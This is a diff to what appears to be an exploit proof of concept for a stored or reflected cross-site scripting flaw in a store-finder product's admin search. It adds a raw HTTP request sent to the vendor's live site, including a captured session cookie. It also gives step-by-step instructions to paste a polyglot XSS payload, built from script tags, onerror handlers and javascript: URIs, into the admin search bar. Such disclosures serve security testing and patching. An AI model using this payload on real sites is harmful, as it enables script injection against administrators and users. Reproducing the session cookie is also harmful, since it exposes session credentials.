@@ -6,6 +6,29 @@
 #Date : 15 Sept 2023
 # Step 1 : Go to admin login, eg: http://localhost/store-finder/admin/
 # Step 2 : login
+Raw request
+
+POST /products/superstorefinder/admin/stores.php HTTP/2
+Host: superstorefinder.net
+Cookie: PHPSESSID=svku0rqs49u1gfbt24c600l841; _ga_97C2F8CQVY=GS1.1.1694762966.1.1.1694762968.0.0.0; _ga=GA1.1.773403993.1694762966
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/117.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 21
+Origin: https://superstorefinder.net
+Referer: https://superstorefinder.net/products/superstorefinder/admin/stores.php
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-origin
+Sec-Fetch-User: ?1
+Te: trailers
+
+search=s*Vulnerable parameter&filter=fname
+
+
 # Step 3: insert below payload in search bar
 ```javascript:alert(1)//\";alert(1);<!--jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//--><FRAME SRC="javascript:alert(1);"></textarea></style></iframe></noscript></noembed></template></option></select></script><img src=x onerror=alert(1)></title><script>alert(1)</script><img src=0 onerror=alert(1)><img src=x:x onerror=alert(1)> alert(1)// 
 ```
